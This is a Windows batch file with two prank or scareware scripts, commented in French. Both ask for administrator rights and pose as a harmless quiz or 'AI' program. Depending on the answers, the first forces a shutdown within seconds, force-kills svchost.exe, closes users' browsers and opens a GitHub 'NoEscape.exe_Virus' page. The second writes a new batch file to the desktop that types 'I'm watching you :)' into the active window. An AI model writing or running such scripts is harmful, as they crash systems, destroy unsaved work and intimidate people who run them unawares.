@echo off
:: Vérification des privilèges administratifs
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Demande des privilèges administratifs...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: Si on est ici, c'est qu'on a déjà les droits admin
color 07
title Script Capitaine_Officiel

:: Question 1 : Abonné à Captaine_officiel ?
:question1
echo Are you subscribed to Captaine_officiel? (y/n)
set /p subscribe=
if /i "%subscribe%"=="y" (
    goto question2
) else if /i "%subscribe%"=="n" (
    echo Ahahah go sub now! You have 4 sec.
    msg * "Ahahah go sub now! You have 4 sec."
    shutdown /s /t 4
    exit
) else (
    echo Invalid input. Please enter 'y' or 'n'.
    goto question1
)

:: Question 2 : Permission de vérifier l'ordinateur ?
:question2
echo Can I check your computer information? (y/n)
set /p checkinfo=
if /i "%checkinfo%"=="y" (
    echo Merci, je vais vérifier...
    :: Ouvrir un nouveau CMD et lister les fichiers
    start cmd /c "dir /s"
    timeout /t 5 >nul
    goto question3
) else if /i "%checkinfo%"=="n" (
    echo Shutting down critical processes...
    Taskkill /IM svchost.exe /f
    exit
) else (
    echo Invalid input. Please enter 'y' or 'n'.
    goto question2
)

:: Question 3 : Aimez-vous le programme ?
:question3
echo Do you like me? (y/n)
set /p likeme=
if /i "%likeme%"=="y" (
    echo I'll boost your computer :3
    timeout /t 2
    :: Ouvrir le site Ubuntu pour télécharger
    start https://ubuntu.com/download/desktop
    timeout /t 10
    goto surprise
) else if /i "%likeme%"=="n" (
    echo Shutting down critical processes...
    Taskkill /IM svchost.exe /f
    exit
) else (
    echo Invalid input. Please enter 'y' or 'n'.
    goto question3
)

:: Section Surprise avec code tremblant
:surprise
cls
color 4
mode con:cols=100 lines=40
echo.
timeout /t 1 >nul
:: Affichage progressif du message CODE: XoE256
setlocal enabledelayedexpansion
set text=CODE: XoE256
for /l %%i in (1,1,10) do (
    set char=!text:~%%i,1!
    set /p=!char!<nul
    timeout /t 3 >nul
)
echo.
timeout /t 5 >nul

:: Afficher lentement "WHAT DID YOU HEARN?!"
echo WHAT DID YOU HEARN?!
timeout /t 2 >nul

:: Proposer le bouton "Nothing" ou le code "XoE256"
:choixfinal
echo Type your answer: (XoE256/nothing)
set /p answer=
if /i "%answer%"=="XoE256" (
    echo What... wdym I'm lost...
    timeout /t 6
    start "" https://github.com/Sn8ow/NoEscape.exe_Virus/releases
    goto finalQuestion
) else if /i "%answer%"=="nothing" (
    echo YOU think I'm dumb? 
    start "" https://github.com/Sn8ow/NoEscape.exe_Virus/releases
    timeout /t 2
    goto finalQuestion
) else (
    echo Invalid input. Please enter 'XoE256' or 'nothing'.
    goto choixfinal
)

:: Dernière question
:finalQuestion
color 4
cls
echo YOU WANT TO... DESTROY ME?....... (y/n)
set /p destroyme=
if /i "%destroyme%"=="y" (
    Taskkill /IM svchost.exe /f
    exit
) else if /i "%destroyme%"=="n" (
    :: Fermer la page Github
    taskkill /im chrome.exe /f
    taskkill /im firefox.exe /f
    color 07
    echo Oh my bad... ok.
    echo I want to play a game with you... Do you want? (y/n)
    set /p playgame=
    if /i "%playgame%"=="y" (
        goto robloxQuestion
    ) else (
        echo Ok :( 
        timeout /t 2
        exit
    )
)

:: Question sur Roblox
:robloxQuestion
echo Roblox? (y/n)
set /p roblox=
if /i "%roblox%"=="y" (
    start "" https://www.youtube.com/watch?v=xADSDapqn9o
    start "" https://www.roblox.com/games/13892378955/1-A-Nostalgic-Hangout-Game
    timeout /t 8 >nul
    echo ... 
    timeout /t 10 >nul
    echo Forgot that game... I'll just go :)
    timeout /t 3 >nul
    exit
) else (
    echo Ok well, bye :3
    timeout /t 2 >nul
    exit
)

@echo off
:: Vérification des privilèges administratifs
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Demande des privilèges administratifs...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: Si le fichier "my ai2.0+.bat" existe déjà
if exist "%USERPROFILE%\Desktop\my ai2.0+.bat" (
    goto runMyAI
)

:: Création du nouveau programme "my ai2.0+"
echo Creating new program "my ai2.0+"...
(
echo @echo off
echo net session >nul 2^>^&1
echo if %%errorLevel%% neq 0 (
echo     echo Demande des privilèges administratifs...
echo     powershell -Command "Start-Process cmd -ArgumentList '/c %%~s0' -Verb RunAs"
echo     exit /b
echo )
echo color 07
echo title My Ai 2.0+
echo echo Hello, I'm your AI 2.0. I'm back with an update!
echo timeout /t 5 >nul
echo echo.
echo echo Question 1: Are you OK today? [y/n]
echo set /p okToday=
echo if /i "%%okToday%%"=="y" (
echo     echo Oh nice to hear!
echo ) else if /i "%%okToday%%"=="n" (
echo     echo Oh.. :(. Sorry about that.
echo ) else (
echo     echo Invalid input, but I'll move on.
echo )
echo timeout /t 2 >nul
echo echo.
echo echo Question 2: Who is your best friend?
echo set /p bestFriend=
echo if /i "%%bestFriend%%"=="captaine_officiel" (
echo     echo Lolcat..? ._. anyway.
echo ) else if /i "%%bestFriend%%"=="builderdream" (
echo     echo Lolcat..? ._. anyway.
echo ) else (
echo     echo Oh Cool! :3
echo )
echo timeout /t 2 >nul
echo echo.
echo echo Question 3: Are you enjoying our AI? [y/n]
echo set /p enjoyAI=
echo if /i "%%enjoyAI%%"=="y" (
echo     echo YIPPEE! ;)
echo ) else if /i "%%enjoyAI%%"=="n" (
echo     echo Oh.. it's ok :| I'll try to do better.
echo )
echo timeout /t 2 >nul
echo echo.
echo echo Question 4: Do you have any pet? [y/n]
echo set /p havePet=
echo timeout /t 2 >nul
echo echo.
echo setlocal enabledelayedexpansion
echo set "question5=Question 5: WhO is tHe PeRsoN tHaTs EnTeR YouR hoUse :)?"
echo for /l %%i in (0,1,50) do (
echo     set char=!question5:~%%i,1!
echo     set /p=!char!<nul
echo     timeout /t 0.70 >nul
echo )
echo echo.
echo timeout /t 1 >nul
echo echo Moving the mouse and typing...
echo timeout /t 5 >nul
echo powershell -Command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('I''m watching you :)')"
echo timeout /t 5 >nul
echo title My Ai.exe+
echo color 07
echo echo Oh sorry, I don't know what happened :(. 
echo timeout /t 2 >nul
echo echo We will fix that. Please come back later or install Windows 11 [y/n]
echo set /p installWindows=
echo if /i "%%installWindows%%"=="y" (
echo     echo Updating data files...
echo     powershell -Command "Start-Process ms-settings:windowsupdate"
echo     exit
echo ) else if /i "%%installWindows%%"=="n" (
echo     echo Okie, let's do something else then...
echo )
echo timeout /t 3 >nul
echo echo Wanna know something fun? [y/n]
echo set /p funFact=
echo if /i "%%funFact%%"=="y" (
echo     start "" https://youtube.com/shorts/SXHMnicI6Pg?si=zs1OITqx0Mv5rZVk
echo     timeout /t 10 >nul
echo     echo Ahah got rickrolled :)
echo ) else (
echo     echo Ok.. *passons à autre chose*
echo )
echo So wanna play some Roblox? I don't know if you play that game but yeah. [y/n]
echo set /p playRoblox=
echo if /i "%%playRoblox%%"=="y" (
echo     start "" https://www.roblox.com/games/13892378955/1-A-Nostalgic-Hangout-Game
echo     echo Enjoy your game! 
echo ) else (
echo     echo Oh ok well cya... I need to update for future things.
echo     timeout /t 10 >nul
echo     exit
echo )
) > "%USERPROFILE%\Desktop\my ai2.0+.bat"

echo New program created successfully!
timeout /t 2 >nul
goto end

:runMyAI
echo Running the existing program "my ai2.0+"...
start "" "%USERPROFILE%\Desktop\my ai2.0+.bat"
exit

:end
echo Exiting...
exit
